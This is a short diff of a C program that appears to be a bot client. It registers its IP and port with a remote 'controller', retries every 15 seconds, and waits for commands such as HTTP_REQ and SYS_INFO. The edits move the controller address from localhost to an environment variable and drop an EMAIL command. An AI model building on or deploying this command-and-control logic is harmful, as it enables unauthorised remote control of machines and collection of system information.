@@ -12,7 +12,7 @@ int main(int argc, char const *argv[])
     /*
      * Connect to controller and send http request like so: http://localhost:8081?PORT=2343&IP=1.2.3.2
      * then close connection and mantain connection on port specified
-     * react to commands: HTTP_REQ -> EMAIL -> SYS_INFO
+     * react to commands: HTTP_REQ -> SYS_INFO
      * after performing such operation inform controller that operation has ended
      */
     setBotIP();
@@ -27,9 +27,9 @@ int main(int argc, char const *argv[])
         if (ret < 0)
         {
             printf("\nConnection failed retry after 15 seconds");
+            fflush(stdout);
+            sleep(15);
         }
-        fflush(stdout);
-        sleep(15);
     }
 
     const union MHD_ConnectionInfo *conninfo;
@@ -65,8 +65,8 @@ int connectToController()
     }
 
     strcpy(url, PROTOCOL);
-    strcat(url, "127.0.1.1");
-    // strcat(url, getenv(CONTROLLER_IP));
+    // strcat(url, "127.0.1.1");
+    strcat(url, getenv(CONTROLLER_IP));
 
     char *query = (char *)malloc(16 + sizeof(IP) + 5);
     sprintf(query, "?PORT=%ld&IP=%s", port, IP);
